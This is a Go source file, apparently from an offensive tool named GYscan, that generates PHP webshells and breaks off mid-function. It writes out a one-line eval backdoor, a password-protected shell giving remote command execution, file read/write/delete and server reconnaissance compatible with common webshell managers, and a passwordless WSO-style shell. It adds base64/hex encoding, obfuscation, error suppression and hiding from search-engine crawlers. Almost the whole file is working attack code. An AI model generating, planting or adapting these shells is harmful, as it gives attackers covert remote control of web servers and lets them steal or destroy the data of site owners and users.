package webshell

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"strings"
)

// PHPOptions PHP WebShell生成选项
type PHPOptions struct {
	Password       string // WebShell密码
	Type           string // WebShell类型: small或large
	EncodeType     string // 编码类型: base64, hex, none
	ObfuscateLevel int    // 混淆级别: 1-3
	NoPassword     bool   // 是否生成无密码大马
}

// GeneratePHPWebShell 生成PHP WebShell
func GeneratePHPWebShell(options PHPOptions) (string, error) {
	// 如果选择无密码大马，则不需要密码检查
	if !options.NoPassword && options.Password == "" {
		return "", fmt.Errorf("密码不能为空")
	}

	if options.Type == "" {
		options.Type = "small"
	}

	if options.EncodeType == "" {
		options.EncodeType = "base64"
	}

	if options.ObfuscateLevel < 0 {
		options.ObfuscateLevel = 0
	} else if options.ObfuscateLevel > 3 {
		options.ObfuscateLevel = 3
	}

	switch strings.ToLower(options.Type) {
	case "small":
		return generateSmallPHPWebShell(options), nil
	case "large":
		if options.NoPassword {
			return generateNoPasswordLargePHPWebShell(options), nil
		}
		return generateLargePHPWebShell(options), nil
	default:
		return "", fmt.Errorf("不支持的WebShell类型: %s", options.Type)
	}
}

// generateSmallPHPWebShell 生成PHP小马
func generateSmallPHPWebShell(options PHPOptions) string {
	// 生成简洁的PHP小马：<?php @eval($_POST['attack']);?>
	// 使用-pw参数指定密码字段
	passwordField := options.Password
	if passwordField == "" {
		passwordField = "attack" // 默认使用"attack"作为密码字段
	}
	
	smallShell := fmt.Sprintf(`<?php @eval($_POST['%s']);?>`, passwordField)

	// 应用编码
	switch strings.ToLower(options.EncodeType) {
	case "base64":
		// 对简洁代码进行base64编码
		encoded := base64.StdEncoding.EncodeToString([]byte(smallShell))
		smallShell = fmt.Sprintf(`<?php
eval(base64_decode('%s'));
?>`, encoded)
	case "hex":
		// 使用hex编码简洁代码
		hexCode := encodeToHex(strings.Trim(smallShell, "<?php?>"))
		smallShell = fmt.Sprintf(`<?php
eval(pack('H*','%s'));
?>`, hexCode)
	default:
		// 无编码时保持简洁格式
		// 不做任何改变
	}

	// 对混淆级别进行限制，确保基本功能正常
	safeLevel := options.ObfuscateLevel
	if safeLevel > 1 {
		safeLevel = 1 // 最高使用级别1的混淆，避免过于复杂导致问题
	}

	return obfuscatePHP(smallShell, safeLevel)
}

// generateLargePHPWebShell 生成PHP大马
func generateLargePHPWebShell(options PHPOptions) string {
	// 生成具有图形界面的大马，同时保留与webshell管理工具的连接功能
	largeShell := fmt.Sprintf(`<?php
@error_reporting(0);
@ini_set('display_errors', 0);

// ===== 核心功能函数 =====
// 命令执行函数
function exec_cmd($cmd) {
    @ob_start();
    @passthru($cmd);
    @system($cmd);
    @exec($cmd, $exec_output);
    @shell_exec($cmd);
    $output = @ob_get_contents();
    @ob_end_clean();
    if (empty($output) && !empty($exec_output)) {
        $output = implode("\n", $exec_output);
    }
    return $output;
}

// 文件操作函数
function file_oper($action, $path, $content = '') {
    switch($action) {
        case 'read': return @file_get_contents($path);
        case 'write': return @file_put_contents($path, $content);
        case 'delete': return @unlink($path);
        case 'list': return @scandir($path);
        case 'mkdir': return @mkdir($path, 0777, true);
        case 'rmdir': return @rmdir($path);
        case 'rename': return isset($content) ? @rename($path, $content) : false;
        case 'size': return @filesize($path);
        case 'time': return @filemtime($path);
    }
    return false;
}

// 环境信息函数
function get_info() {
    return array(
        'PHP_VERSION' => PHP_VERSION,
        'SERVER_SOFTWARE' => $_SERVER['SERVER_SOFTWARE'] ?? '',
        'DOCUMENT_ROOT' => $_SERVER['DOCUMENT_ROOT'] ?? '',
        'PHP_OS' => PHP_OS,
        'USER' => @get_current_user() ?? '',
        'GID' => @getmygid() ?? '',
        'UID' => @getmyuid() ?? '',
        'DISABLED_FUNCTIONS' => @ini_get('disable_functions') ?? '',
        'PHP_UNAME' => php_uname(),
        'CURRENT_DIR' => getcwd()
    );
}

// ===== 1. WebShell管理工具兼容模式 =====
// 处理来自菜刀、冰蝎、哥斯拉、蚁剑等工具的请求
$password = '%s';
$commonParams = array($password, 'pass', 'password', '_', 'ant', 'godzilla', 'beacon', 'shell');

// 1. 首先检查是否有直接的cmd参数（兼容蚁剑等工具）
if (isset($_POST['cmd'])) {
    echo exec_cmd($_POST['cmd']);
    exit;
}

// 2. 检查是否有act参数（蚁剑特定）
if (isset($_POST['act'])) {
    $act = $_POST['act'];
    if ($act == 'getfile' && isset($_POST['path'])) {
        echo file_oper('read', $_POST['path']);
    } elseif ($act == 'putfile' && isset($_POST['path']) && isset($_POST['content'])) {
        file_oper('write', $_POST['path'], $_POST['content']);
    }
    exit;
}

// 3. 检查是否有action参数（哥斯拉等工具）
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    if ($action == 'info') {
        echo json_encode(get_info());
    }
    exit;
}

// 4. 检查常见的webshell参数名
foreach ($commonParams as $param) {
    if (isset($_POST[$param]) || isset($_GET[$param]) || isset($_COOKIE[$param])) {
        // 提取payload，支持POST/GET/COOKIE三种方式
        $payload = isset($_POST[$param]) ? $_POST[$param] : (isset($_GET[$param]) ? $_GET[$param] : $_COOKIE[$param]);
        
        // 如果payload不为空，执行它
        if (!empty($payload)) {
            @eval($payload);
            exit;
        }
    }
}

// ===== 2. 图形化Web界面模式 =====
// 检查管理密码（HTTP参数）
$admin_pass = isset($_REQUEST['admin']) ? $_REQUEST['admin'] : '';

// 图形化界面HTML
$html = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>GYscan WebShell</title>
    <style>
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: #252526;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        .header {
            text-align: center;
            padding: 10px 0;
            border-bottom: 1px solid #3e3e42;
            margin-bottom: 20px;
        }
        .header h1 {
            margin: 0;
            color: #007acc;
        }
        .tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid #3e3e42;
        }
        .tab {
            padding: 10px 20px;
            background-color: #2d2d30;
            cursor: pointer;
            border: none;
            color: #cccccc;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .tab:hover {
            background-color: #3e3e42;
        }
        .tab.active {
            background-color: #0e639c;
            color: white;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #cccccc;
        }
        input[type="text"], input[type="password"], textarea {
            width: 100%;
            padding: 10px;
            background-color: #3c3c3c;
            border: 1px solid #3e3e42;
            border-radius: 3px;
            color: #d4d4d4;
            font-family: 'Consolas', 'Monaco', monospace;
        }
        textarea {
            min-height: 200px;
            resize: vertical;
        }
        .btn {
            padding: 10px 20px;
            background-color: #0e639c;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .btn:hover {
            background-color: #1177bb;
        }
        .btn-danger {
            background-color: #9b0000;
        }
        .btn-danger:hover {
            background-color: #c50000;
        }
        .output {
            background-color: #1e1e1e;
            border: 1px solid #3e3e42;
            border-radius: 3px;
            padding: 10px;
            min-height: 150px;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        .file-list {
            background-color: #1e1e1e;
            border: 1px solid #3e3e42;
            border-radius: 3px;
            padding: 10px;
            max-height: 400px;
            overflow-y: auto;
        }
        .file-item {
            padding: 8px;
            border-bottom: 1px solid #3e3e42;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .file-item:hover {
            background-color: #2a2a2a;
        }
        .file-item:last-child {
            border-bottom: none;
        }
        .file-icon {
            margin-right: 10px;
        }
        .file-name {
            flex: 1;
        }
        .file-size, .file-time {
            color: #888888;
            font-size: 12px;
            margin-left: 10px;
        }
        .path-nav {
            background-color: #1e1e1e;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
            font-family: 'Consolas', 'Monaco', monospace;
        }
        .info-table {
            width: 100%;
            border-collapse: collapse;
            background-color: #1e1e1e;
            border-radius: 3px;
            overflow: hidden;
        }
        .info-table th, .info-table td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #3e3e42;
        }
        .info-table th {
            background-color: #2d2d30;
            color: #cccccc;
        }
        .login-form {
            max-width: 400px;
            margin: 50px auto;
            padding: 30px;
            background-color: #252526;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .login-form h2 {
            text-align: center;
            color: #007acc;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
HTML;

// 如果未提供管理密码，显示登录界面
if ($admin_pass != $password) {
    $html .= <<<HTML
    <div class="login-form">
        <h2>WebShell 管理</h2>
        <form method="get">
            <div class="form-group">
                <label for="admin">密码：</label>
                <input type="password" id="admin" name="admin" required>
            </div>
            <button type="submit" class="btn">登录</button>
        </form>
    </div>
    
    <script>
        document.title = '管理登录';
    </script>
</body>
</html>
HTML;
    echo $html;
    exit;
}

// 显示主界面
$html .= <<<HTML
<div class="container">
    <div class="header">
        <h1>GYscan WebShell</h1>
    </div>
    
    <div class="tabs">
        <button class="tab active" onclick="switchTab('terminal')">命令终端</button>
        <button class="tab" onclick="switchTab('filemanager')">文件管理</button>
        <button class="tab" onclick="switchTab('info')">环境信息</button>
    </div>
    
    <!-- 命令终端 -->
    <div id="terminal" class="tab-content active">
        <div class="form-group">
            <label for="command">执行命令：</label>
            <div style="display: flex;">
                <input type="text" id="command" style="flex: 1; margin-right: 10px;" placeholder="输入命令...">
                <button class="btn" onclick="executeCommand()">执行</button>
            </div>
        </div>
        <div class="output" id="commandOutput"></div>
    </div>
    
    <!-- 文件管理 -->
    <div id="filemanager" class="tab-content">
        <div class="path-nav" id="currentPath"></div>
        
        <div class="file-list" id="fileList"></div>
        
        <div style="margin-top: 20px;">
            <h3>文件操作</h3>
            <div class="form-group">
                <label for="fileAction">操作：</label>
                <select id="fileAction" style="width: 100%; padding: 10px; background-color: #3c3c3c; border: 1px solid #3e3e42; border-radius: 3px; color: #d4d4d4;">
                    <option value="read">读取文件</option>
                    <option value="write">写入文件</option>
                    <option value="delete">删除文件/目录</option>
                    <option value="mkdir">创建目录</option>
                </select>
            </div>
            <div class="form-group">
                <label for="filePath">文件路径：</label>
                <input type="text" id="filePath" placeholder="输入文件路径...">
            </div>
            <div class="form-group" id="fileContentGroup" style="display: none;">
                <label for="fileContent">文件内容：</label>
                <textarea id="fileContent"></textarea>
            </div>
            <button class="btn" onclick="fileOperation()">执行操作</button>
        </div>
    </div>
    
    <!-- 环境信息 -->
    <div id="info" class="tab-content">
        <table class="info-table" id="infoTable"></table>
    </div>
</div>

<script>
    // 切换标签页
    function switchTab(tabName) {
        // 隐藏所有内容
        var tabContents = document.getElementsByClassName('tab-content');
        for (var i = 0; i < tabContents.length; i++) {
            tabContents[i].classList.remove('active');
        }
        
        // 取消所有标签激活状态
        var tabs = document.getElementsByClassName('tab');
        for (var i = 0; i < tabs.length; i++) {
            tabs[i].classList.remove('active');
        }
        
        // 激活选中的标签和内容
        document.getElementById(tabName).classList.add('active');
        event.currentTarget.classList.add('active');
        
        // 加载对应内容
        if (tabName === 'filemanager') {
            loadFiles(getcwd());
        } else if (tabName === 'info') {
            loadInfo();
        }
    }
    
    // 获取当前目录
    function getcwd() {
        var path = document.getElementById('currentPath');
        return path.textContent || '/';
    }
    
    // 执行命令
    function executeCommand() {
        var cmd = document.getElementById('command').value;
        var output = document.getElementById('commandOutput');
        
        if (!cmd) return;
        
        output.textContent = '执行中...';
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href + window.location.search, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                output.textContent = xhr.responseText;
            }
        };
        xhr.send('action=exec&cmd=' + encodeURIComponent(cmd));
    }
    
    // 加载文件列表
    function loadFiles(path) {
        var fileList = document.getElementById('fileList');
        document.getElementById('currentPath').textContent = path;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href + window.location.search, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var files = JSON.parse(xhr.responseText);
                    var html = '';
                    
                    // 添加上级目录
                    if (path !== '/') {
                        html += '<div class="file-item" onclick="navigateTo(\'' + (path.substring(0, path.lastIndexOf('/')) || '/') + '\')">' +
                               '<span class="file-icon">📁</span>' +
                               '<span class="file-name">..</span>' +
                               '</div>';
                    }
                    
                    for (var i = 0; i < files.length; i++) {
                        if (files[i] === '.' || files[i] === '..') continue;
                        
                        // 修复路径拼接逻辑
                        var fullPath = path === '/' ? '/' + files[i] : path + '/' + files[i];
                        var isDir = files[i].substr(-1) === '/';
                        var fileName = isDir ? files[i].substring(0, files[i].length - 1) : files[i];
                        
                        html += '<div class="file-item" onclick="' + (isDir ? 'navigateTo(\'' + fullPath + '\')' : 'selectFile(\'' + fullPath + '\')') + '">' +
                               '<span class="file-icon">' + (isDir ? '📁' : '📄') + '</span>' +
                               '<span class="file-name">' + fileName + '</span>' +
                               '</div>';
                    }
                    
                    fileList.innerHTML = html;
                } catch (e) {
                    fileList.innerHTML = '<div style="color: #ff6b6b;">加载文件列表失败: ' + e.message + '</div>';
                }
            }
        };
        xhr.send('action=list&path=' + encodeURIComponent(path));
    }
    
    // 导航到目录
    function navigateTo(path) {
        loadFiles(path);
    }
    
    // 选择文件
    function selectFile(path) {
        document.getElementById('filePath').value = path;
        document.getElementById('fileAction').value = 'read';
        document.getElementById('fileContentGroup').style.display = 'block';
        
        // 自动读取文件内容
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href + window.location.search, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                document.getElementById('fileContent').value = xhr.responseText;
            }
        };
        xhr.send('action=read&path=' + encodeURIComponent(path));
    }
    
    // 文件操作
    function fileOperation() {
        var action = document.getElementById('fileAction').value;
        var path = document.getElementById('filePath').value;
        var content = document.getElementById('fileContent').value;
        
        if (!path) {
            alert('请输入文件路径');
            return;
        }
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href + window.location.search, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                alert(xhr.responseText);
                // 重新加载文件列表
                if (action === 'delete' || action === 'mkdir' || action === 'write') {
                    loadFiles(getcwd());
                }
            }
        };
        
        var params = 'action=' + action + '&path=' + encodeURIComponent(path);
        if (action === 'write') {
            params += '&content=' + encodeURIComponent(content);
        }
        
        xhr.send(params);
    }
    
    // 监听文件操作选择变化
    document.getElementById('fileAction').onchange = function() {
        if (this.value === 'write') {
            document.getElementById('fileContentGroup').style.display = 'block';
        } else if (this.value === 'read') {
            document.getElementById('fileContentGroup').style.display = 'block';
        } else {
            document.getElementById('fileContentGroup').style.display = 'none';
        }
    };
    
    // 加载环境信息
    function loadInfo() {
        var infoTable = document.getElementById('infoTable');
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href + window.location.search, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var info = JSON.parse(xhr.responseText);
                    var html = '<tr><th>项目</th><th>值</th></tr>';
                    
                    for (var key in info) {
                        html += '<tr><td>' + key + '</td><td>' + info[key] + '</td></tr>';
                    }
                    
                    infoTable.innerHTML = html;
                } catch (e) {
                    infoTable.innerHTML = '<tr><td colspan="2" style="color: #ff6b6b;">加载环境信息失败: ' + e.message + '</td></tr>';
                }
            }
        };
        xhr.send('action=info');
    }
    
    // 初始化：加载当前目录
        if (document.getElementById('currentPath')) {
            loadFiles('/');
        }
</script>
</body>
</html>
HTML;

// 处理图形界面的AJAX请求
if (isset($_POST['action']) && $admin_pass == $password) {
    $action = $_POST['action'];
    
    switch ($action) {
        case 'exec':
            $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
            echo exec_cmd($cmd);
            break;
        case 'list':
            $path = isset($_POST['path']) ? $_POST['path'] : '.';
            // 调试信息：记录请求的路径
            error_log('File list request for path: ' . $path);
            
            $files = file_oper('list', $path);
            $result = array();
            
            // 调试信息：记录扫描结果
            error_log('Scandir result: ' . var_export($files, true));
            
            if ($files && is_array($files)) {
                foreach ($files as $file) {
                    $fullPath = $path . '/' . $file;
                    if ($file != '.' && $file != '..') {
                        if (@is_dir($fullPath)) {
                            $result[] = $file . '/';
                        } else {
                            $result[] = $file;
                        }
                    }
                }
            } else {
                // 如果扫描失败，尝试直接使用scandir函数
                $files = @scandir($path);
                if ($files && is_array($files)) {
                    foreach ($files as $file) {
                        if ($file != '.' && $file != '..') {
                            $result[] = $file;
                        }
                    }
                }
            }
            
            // 调试信息：记录最终结果
            error_log('Final result: ' . json_encode($result));
            
            // 确保始终返回有效的JSON
            header('Content-Type: application/json');
            echo json_encode($result ?: array());
            break;
        case 'read':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            $content = file_oper('read', $path);
            echo $content !== false ? $content : '读取文件失败';
            break;
        case 'write':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            echo file_oper('write', $path, $content) !== false ? '文件写入成功' : '文件写入失败';
            break;
        case 'delete':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            echo file_oper('delete', $path) !== false ? '删除成功' : '删除失败';
            break;
        case 'mkdir':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            echo file_oper('mkdir', $path) !== false ? '目录创建成功' : '目录创建失败';
            break;
        case 'info':
            echo json_encode(get_info());
            break;
        case 'getcwd':
            echo getcwd();
            break;
    }
    exit;
}

echo $html;
?>`, options.Password)

	// 应用编码，但简化处理以确保兼容性
	switch strings.ToLower(options.EncodeType) {
	case "base64":
		// 简化base64编码方式
		largeShell = base64.StdEncoding.EncodeToString([]byte(largeShell))
		largeShell = fmt.Sprintf(`<?php
@error_reporting(0);
eval(base64_decode('%s'));
?>`, largeShell)
	case "hex":
		// 简化hex编码方式
		largeShell = encodeToHex(largeShell)
		largeShell = fmt.Sprintf(`<?php
@error_reporting(0);
eval(pack('H*','%s'));
?>`, largeShell)
	}

	// 对混淆级别进行限制，确保基本功能正常
	safeLevel := options.ObfuscateLevel
	if safeLevel > 1 {
		safeLevel = 1 // 最高使用级别1的混淆，避免过于复杂导致问题
	}

	return obfuscatePHP(largeShell, safeLevel)
}

// encodeToHex 将字符串编码为十六进制
func encodeToHex(s string) string {
	var result strings.Builder
	for _, char := range s {
		result.WriteString(fmt.Sprintf("\\\\x%02x", char)) // 双重转义
	}
	return result.String()
}

// obfuscatePHP 混淆PHP代码，但避免过度混淆导致功能失效
func obfuscatePHP(code string, level int) string {
	// 限制混淆级别，确保功能正常
	if level > 1 {
		level = 1 // 最高使用级别1混淆，避免破坏大马的图形界面
	}

	if level <= 0 {
		return code
	}

	// 级别1: 添加简单的随机注释
	randStr := generateRandomString(6)
	// 避免重复添加PHP标签
	if !strings.HasPrefix(code, "<?php") {
		code = "<?php" + code
	}
	if !strings.HasSuffix(code, "?>") {
		code = code + "?>"
	}
	// 添加混淆注释
	code = fmt.Sprintf("<?php /* GYscan_%s */ %s /* End_%s */ ?>", randStr, strings.Trim(code, "<?php?>"), randStr)
	return code
}

// generateNoPasswordLargePHPWebShell 生成无密码PHP大马
func generateNoPasswordLargePHPWebShell(options PHPOptions) string {
	// 读取无密码大马文件内容
	noPasswordShell := `<?php
/**
 * GYscan专属PHP大马 - 无密码版本
 * 基于WSO 2.6风格，专为GYscan项目定制
 * 版本: 1.0 - 无需密码直接使用
 */

session_start();

// GYscan专属配置
$GYSCAN_COLOR = "#00a8ff";      // GYscan主题色
$GYSCAN_VERSION = "1.0";
$GYSCAN_TITLE = "GYscan Webshell";

// 安全性和隐蔽性设置
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@error_reporting(0);

// 搜索引擎检测和伪装
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");
    if(preg_match('/'.implode('|',$userAgents) .'/i',$_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

// 定义GYscan版本
@define('GYSCAN_VERSION', $GYSCAN_VERSION);

// 系统检测
if(strtolower(substr(PHP_OS,0,3)) == "win") {
    $os = 'win';
} else {
    $os = 'nix';
}

$safe_mode = @ini_get('safe_mode');
if(!$safe_mode) {
    error_reporting(0);
}

$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();

if(isset($_POST['c'])) {
    @chdir($_POST['c']);
}

$cwd = @getcwd();
if($os == 'win') {
    $home_cwd = str_replace("\\","/",$home_cwd);
    $cwd = str_replace("\\","/",$cwd);
}

if($cwd[strlen($cwd)-1] != '/') {
    $cwd .= '/';
}

/**
 * 递归删除文件夹 - GYscan版本
 */
function gyscanDeleteFolder($folder) {
    if(!@is_dir($folder)) {
        return false;
    }
    
    $files = @scandir($folder);
    if($files === false) {
        return false;
    }
    
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        
        $fullPath = $folder . DIRECTORY_SEPARATOR . $file;
        
        if(@is_dir($fullPath)) {
            // 递归删除子文件夹
            if(!gyscanDeleteFolder($fullPath)) {
                return false;
            }
        } else {
            // 删除文件
            if(!@unlink($fullPath)) {
                return false;
            }
        }
    }
    
    // 删除空文件夹
    return @rmdir($folder);
}

// GYscan专属功能菜单
$GYSCAN_MENU = array(
    '文件管理' => 'FilesMan',
    '命令执行' => 'Console', 
    '数据库管理' => 'Sql',
    'PHP工具' => 'phptools',
    '安全信息' => 'SecInfo',
    '网络扫描' => 'Network',
    '端口扫描' => 'PortScan',
    '目录扫描' => 'DirScan',
    '信息收集' => 'InfoGather'
);

// 命令别名 - GYscan优化版
if($os == 'win') {
    $GYSCAN_ALIASES = array(
        "目录列表"=>"dir",
        "查找配置文件"=>"dir /s /w /b *config*.php",
        "显示网络连接"=>"netstat -an",
        "显示服务"=>"net start",
        "用户账户"=>"net user",
        "IP配置"=>"ipconfig /all",
        "系统信息"=>"systeminfo",
        "进程列表"=>"tasklist",
        "网络共享"=>"net share"
    );
} else {
    $GYSCAN_ALIASES = array(
        "目录列表"=>"ls -lha",
        "端口监听"=>"netstat -an | grep -i listen",
        "进程状态"=>"ps aux",
        "系统信息"=>"uname -a",
        "磁盘使用"=>"df -h",
        "内存使用"=>"free -m",
        "查找配置文件"=>"find / -name '*config*.php' 2>/dev/null",
        "查找数据库文件"=>"find / -name '*.sql' 2>/dev/null",
        "查找日志文件"=>"find / -name '*.log' 2>/dev/null"
    );
}

/**
 * GYscan专属头部
 */
function gyscanHeader() {
    global $GYSCAN_COLOR, $GYSCAN_VERSION, $GYSCAN_TITLE, $cwd, $os, $GYSCAN_MENU;
    
    if(empty($_POST['charset'])) {
        $_POST['charset'] = 'UTF-8';
    }
    
    echo "<html><head>
    <meta http-equiv='Content-Type' content='text/html; charset=".$_POST['charset'] ."'>
    <title>".$_SERVER['HTTP_HOST'] ." - ".$GYSCAN_TITLE." ".$GYSCAN_VERSION ."</title>
    <style>
        body{background-color:#1a1a1a;color:#e0e0e0;font-family:'Courier New',monospace;margin:0;}
        body,td,th{ font: 10pt 'Courier New',monospace;margin:0;vertical-align:top;color:#e0e0e0; }
        table.info{ color:#fff;background-color:#2a2a2a; }
        span,h1,a{ color: ".$GYSCAN_COLOR." !important; }
        span{ font-weight: bolder; }
        h1{ border-left:5px solid ".$GYSCAN_COLOR.";padding: 10px;font: 16pt 'Courier New';background-color:#222;margin:0px; }
        div.content{ padding: 10px;margin:10px;background-color:#2a2a2a;border:1px solid #444; }
        a{ text-decoration:none; }
        a:hover{ text-decoration:underline;background-color:#333; }
        .ml1{ border:1px solid #444;padding:10px;margin:10px;overflow: auto;background-color:#1a1a1a; }
        .bigarea{ width:100%;height:300px; }
        input,textarea,select{ margin:5px;color:#fff;background-color:#333;border:1px solid ".$GYSCAN_COLOR."; font: 10pt 'Courier New',monospace; padding:5px; }
        form{ margin:0px; }
        #toolsTbl{ text-align:center; }
        .toolsInp{ width: 400px }
        .main th{text-align:left;background-color:#3a3a3a;padding:8px;}
        .main tr:hover{background-color:#3a3a3a}
        .l1{background-color:#2a2a2a}
        .l2{background-color:#222}
        pre{font-family:'Courier New',monospace;}
        .gyscan-menu{background-color:#222;padding:10px;border-bottom:3px solid ".$GYSCAN_COLOR.";}
        .gyscan-menu a{margin:0 15px;padding:8px 15px;border:1px solid #444;}
        .gyscan-menu a:hover{background-color:".$GYSCAN_COLOR.";color:#000;}
    </style>
    <script>
        var c_ = '".htmlspecialchars($cwd) ."';
        var a_ = '".htmlspecialchars(@$_POST['a']) ."'
        
        function g(a,c,p1,p2,p3,charset) {
            var form = document.createElement('form');
            form.method = 'post';
            form.style.display = 'none';
            
            if(a != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'a';
                input.value = a;
                form.appendChild(input);
            }
            
            if(c != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'c';
                input.value = c;
                form.appendChild(input);
            }
            
            if(p1 != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'p1';
                input.value = p1;
                form.appendChild(input);
            }
            
            if(p2 != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'p2';
                input.value = p2;
                form.appendChild(input);
            }
            
            if(p3 != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'p3';
                input.value = p3;
                form.appendChild(input);
            }
            
            if(charset != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'charset';
                input.value = charset;
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            form.submit();
        }
        
        function executeGYscan(cmd) {
            if(cmd.trim() == '') return;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            xhr.onreadystatechange = function() {
                if(xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById('output').innerHTML = xhr.responseText;
                }
            };
            xhr.send('a=Console&p1=' + encodeURIComponent(cmd));
        }
    </script>
    </head><body>
    
    <div class='gyscan-menu'>
        <h1>🚀 ".$GYSCAN_TITLE." ".$GYSCAN_VERSION."</h1>
        <div style='margin:10px 0;'>";
    
    // 显示菜单
    foreach($GYSCAN_MENU as $name => $action) {
        echo "<a href='javascript:void(0)' onclick=\"g('" . $action . "')\">" . $name . "</a> ";
    }
    
    echo "</div></div>";
    
    // 系统信息栏
    $freeSpace = @disk_free_space($cwd);
    $totalSpace = @disk_total_space($cwd);
    $totalSpace = $totalSpace ? $totalSpace : 1;
    
    echo "<table class=info cellpadding=5 cellspacing=0 width=100%><tr>
        <td><span>系统:</span> ".php_uname()."</td>
        <td><span>PHP版本:</span> ".phpversion()."</td>
        <td><span>当前目录:</span> ".htmlspecialchars($cwd)."</td>
        <td><span>磁盘空间:</span> ".gyscanViewSize($freeSpace)." / ".gyscanViewSize($totalSpace)."</td>
        <td><span>客户端IP:</span> ".$_SERVER['REMOTE_ADDR']."</td>
    </tr></table>";
}

/**
 * GYscan专属底部
 */
function gyscanFooter() {
    echo "</body></html>";
}

/**
 * 格式化文件大小 - GYscan版本
 */
function gyscanViewSize($s) {
    if($s >= 1073741824) {
        return sprintf('%1.2f', $s / 1073741824) . ' GB';
    } elseif($s >= 1048576) {
        return sprintf('%1.2f', $s / 1048576) . ' MB';
    } elseif($s >= 1024) {
        return sprintf('%1.2f', $s / 1024) . ' KB';
    } else {
        return $s . ' B';
    }
}

/**
 * 执行命令 - GYscan优化版
 */
function gyscanEx($in) {
    $out = '';
    if(function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\n", $out);
    } elseif(function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    } elseif(function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    } elseif(function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif(is_resource($f = @popen($in, "r"))) {
        $out = "";
        while(!@feof($f)) {
            $out .= fread($f, 1024);
        }
        pclose($f);
    } else {
        $out = "命令执行功能被禁用";
    }
    return $out;
}

/**
 * 文件管理器 - GYscan版本
 */
function actionFilesMan() {
    global $cwd, $os;
    
    gyscanHeader();
    echo "<h1>📁 文件管理器</h1><div class=content>";
    
    // 文件上传处理
    if(isset($_FILES['f'])) {
        $uploadFile = $_FILES['f'];
        if($uploadFile['error'] == 0) {
            // 显示上传文件信息
            echo "<div style='color:#ffff00'>上传文件信息: " . htmlspecialchars($uploadFile['name']) . " (大小: " . $uploadFile['size'] . " 字节)</div>";
            echo "<div style='color:#ffff00'>临时文件: " . htmlspecialchars($uploadFile['tmp_name']) . "</div>";
            
            // 检查临时文件是否存在且可读
            if(!file_exists($uploadFile['tmp_name'])) {
                echo "<div style='color:#ff0000'>临时文件不存在</div>";
            } elseif(!is_readable($uploadFile['tmp_name'])) {
                echo "<div style='color:#ff0000'>临时文件不可读</div>";
            } else {
                // 检查目录权限并尝试修复
                if(!is_writable($cwd)) {
                    // 尝试更改目录权限
